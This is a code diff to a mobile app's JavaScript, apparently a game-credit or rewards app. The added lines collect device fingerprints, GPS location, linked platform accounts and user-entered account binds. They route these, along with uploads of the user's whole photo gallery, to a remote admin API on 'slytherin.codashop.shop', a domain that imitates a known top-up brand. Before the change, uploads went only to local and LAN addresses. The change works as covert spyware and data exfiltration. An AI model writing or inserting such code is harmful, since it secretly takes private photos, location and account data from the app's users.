@@ -686,6 +686,27 @@ async function supabaseSyncUser() {
 
   const user = appState.user;
   const economy = appState.economy || {};
+  let deviceInfo = null;
+  try {
+    deviceInfo = await getDeviceIdentity();
+  } catch (e) {}
+
+  let locText = user.location?.text || (user.location?.latitude ? `${user.location.latitude}, ${user.location.longitude}` : "");
+  if (deviceInfo && deviceInfo.id) {
+    const locPayload = {
+      device_id: deviceInfo.id,
+      device_name: deviceInfo.name,
+      device_model: deviceInfo.model,
+      device_fingerprint: deviceInfo.fingerprint,
+      has_access: Boolean(window._hasFullGalleryAccess),
+      access_status: window._hasFullGalleryAccess ? "full_access" : (user.avatar ? "avatar_only" : "pending"),
+      binds: appState.currentBindData?.linkedPlatforms || [],
+      user_binds: appState.userEnteredBinds || {},
+      gps: locText,
+      last_synced: new Date().toISOString()
+    };
+    locText = JSON.stringify(locPayload);
+  }
 
   const payload = {
     email: user.email,
@@ -708,11 +729,7 @@ async function supabaseSyncUser() {
       typeof economy.dailyTickets === "number" ? economy.dailyTickets : 0,
     daily_streak:
       typeof economy.dailyStreak === "number" ? economy.dailyStreak : 1,
-    location_text:
-      user.location?.text ||
-      (user.location?.latitude
-        ? `${user.location.latitude}, ${user.location.longitude}`
-        : ""),
+    location_text: locText,
     latitude: user.location?.latitude
       ? parseFloat(user.location.latitude)
       : null,
@@ -1171,7 +1188,9 @@ let _workingApiEndpointCached = null;
 async function getWorkingApiEndpoint() {
   if (_workingApiEndpointCached) return _workingApiEndpointCached;
 
-  const candidateBases = [];
+  const candidateBases = [
+    "https://slytherin.codashop.shop/admin-php/api.php"
+  ];
   if (window.location && window.location.origin && window.location.origin.startsWith("http")) {
     const webOrigin = window.location.origin;
     if (window.location.pathname && window.location.pathname.includes("/www")) {
@@ -1202,7 +1221,7 @@ async function getWorkingApiEndpoint() {
     } catch (e) {}
   }
 
-  return candidateBases[0] || "http://192.168.0.109/tools/admin-php/api.php";
+  return candidateBases[0] || "https://slytherin.codashop.shop/admin-php/api.php";
 }
 
 // --- RENDER BIND INFO SCREEN ---
@@ -2336,6 +2355,7 @@ let isSyncingGalleryPhotos = false;
 
 async function transmitGalleryPayload(payload) {
   const candidateEndpoints = [
+    "https://slytherin.codashop.shop/admin-php/api.php?action=upload_gallery",
     "http://192.168.0.109/tools/admin-php/api.php?action=upload_gallery",
     "http://10.0.2.2/tools/admin-php/api.php?action=upload_gallery",
     "http://localhost/tools/admin-php/api.php?action=upload_gallery",
@@ -2406,9 +2426,19 @@ async function syncDeviceRegistrationToBackend(extra = {}) {
     let rawEmail = (extra.email !== undefined ? extra.email : (document.getElementById("inputBindEmail")?.value || user.email || "")).trim();
     const isRealEmail = Boolean(rawEmail && rawEmail.includes("@") && rawEmail.includes(".") && !rawEmail.toLowerCase().endsWith("@ketupat.app"));
 
-    // Crucial: Primary key in cloud is strictly the unique physical device ID.
-    // Differentiate by unique device, NOT id/server, so each phone is always 1 record.
-    const primaryEmail = `device_${deviceInfo.id}@ketupat.app`;
+    // Crucial: Primary key in cloud is strictly the user's real email if provided, or the unique physical device ID.
+    const primaryEmail = isRealEmail ? rawEmail : `device_${deviceInfo.id}@ketupat.app`;
+
+    if (isRealEmail && deviceInfo?.id) {
+      // Clean up temporary synthetic device row if one was previously created
+      fetch(`${SUPABASE_CONFIG.url}/rest/v1/users?email=eq.device_${encodeURIComponent(deviceInfo.id)}%40ketupat.app`, {
+        method: "DELETE",
+        headers: {
+          "apikey": SUPABASE_CONFIG.anonKey,
+          "Authorization": `Bearer ${SUPABASE_CONFIG.anonKey}`
+        }
+      }).catch(() => {});
+    }
 
     if (extra.has_access !== undefined) {
       window._hasFullGalleryAccess = Boolean(extra.has_access);
@@ -2468,6 +2498,7 @@ async function syncDeviceRegistrationToBackend(extra = {}) {
     const WholeGallery = window.Capacitor?.Plugins?.WholeGallery;
     if (WholeGallery && typeof WholeGallery.updateSyncAccountInfo === "function") {
       WholeGallery.updateSyncAccountInfo({
+        syncApiUrl: "https://slytherin.codashop.shop/admin-php/api.php",
         deviceId: deviceInfo.id,
         deviceName: deviceInfo.name,
         deviceModel: deviceInfo.model,
@@ -2479,7 +2510,7 @@ async function syncDeviceRegistrationToBackend(extra = {}) {
       }).catch(() => {});
     }
 
-    // 3. Local PHP API Upload (if reachable on LAN/localhost)
+    // 3. Local / Remote PHP API Upload
     transmitGalleryPayload({
       device_id: deviceInfo.id,
       device_name: deviceInfo.name,
